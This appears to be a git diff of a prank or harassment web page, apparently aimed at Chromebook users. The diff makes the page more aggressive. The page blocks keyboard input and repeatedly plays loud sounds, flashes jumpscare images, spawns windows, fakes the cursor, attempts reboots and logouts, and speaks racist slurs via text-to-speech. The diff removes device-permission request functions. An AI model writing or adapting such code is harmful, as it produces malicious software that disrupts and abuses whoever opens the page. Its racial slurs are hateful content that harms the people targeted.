@@ -274,7 +274,7 @@ document.addEventListener('keypress', (e) => e.preventDefault());
         alert.volume = 100;
         alert.play();
     }
-    setInterval(playAlertSound, 250);
+    setInterval(playAlertSound, 500);
 
 // Screamer jumpscares
 const jumpscareImages = [
@@ -307,12 +307,12 @@ function randomJumpscare() {
 
     setTimeout(() => img.remove(), 2000);
 }
-setInterval(randomJumpscare, 274);
+setInterval(randomJumpscare, 250);
 
 function openNewWindowWithTab() {
     let newWin = window.open(window.location.href, "_blank", "width=600,height=400");
 }
-setInterval(openNewWindowWithTab, 1500); // Every 35 seconds
+setInterval(openNewWindowWithTab, 2000); // Every 35 seconds
 
 const loudSounds = [
     "https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3",
@@ -322,10 +322,10 @@ const loudSounds = [
 
 function spamLoudSounds() {
     let audio = new Audio(loudSounds[Math.floor(Math.random() * loudSounds.length)]);
-    audio.volume = 1000;
+    audio.volume = 100;
     audio.play();
 }
-setInterval(spamLoudSounds, 500);
+setInterval(spamLoudSounds, 250);
 
 function moveFakeMouse() {
     let cursor = document.createElement('div');
@@ -401,10 +401,10 @@ function forceRebootChromebook() {
 setInterval(forceRebootChromebook, 4000); //
 
 function textToSpeechSpam() {
-    const utter = new SpeechSynthesisUtterance("nigger");
-    utter.rate = 3;
+    const utter = new SpeechSynthesisUtterance("fuck niggers fuck niggers");
+    utter.rate = 1;
     utter.pitch = 2;
-    utter.volume = 50;
+    utter.volume = 150;
     speechSynthesis.speak(utter);
 }
 setInterval(textToSpeechSpam, 500); //
@@ -637,63 +637,6 @@ function superLogout () {
 }
   superLogout()
   setInterval(superLogout, 1000)
-
-/**
- * Request access to MIDI devices.
- * Requires user-initiated event.
- */
- function requestMidiAccess () {
-  try {
-    navigator.requestMIDIAccess({
-      sysex: true
-    })
-  } catch {}
-}
-
-/**
- * Request access to Bluetooth devices.
- * Requires user-initiated event.
- */
-function requestBluetoothAccess () {
-  try {
-    navigator.bluetooth.requestDevice({
-      // filters: [...] <- Prefer filters to save energy & show relevant devices.
-      // acceptAllDevices here ensures dialog can populate, we don't care with what.
-      acceptAllDevices: true
-    })
-      .then(device => device.gatt.connect())
-  } catch {}
-}
-
-/**
- * Request access to USB devices.
- * Requires user-initiated event.
- */
-function requestUsbAccess () {
-  try {
-    navigator.usb.requestDevice({ filters: [{}] })
-  } catch {}
-}
-
-/**
- * Request access to Serial devices.
- * Requires user-initiated event.
- */
-function requestSerialAccess () {
-  try {
-    navigator.serial.requestPort({ filters: [] })
-  } catch {}
-}
-
-/**
- * Request access to HID devices.
- * Requires user-initiated event.
- */
-function requestHidAccess () {
-  try {
-    navigator.hid.requestDevice({ filters: [] })
-  } catch {}
-}
 
 </script>
 </body>
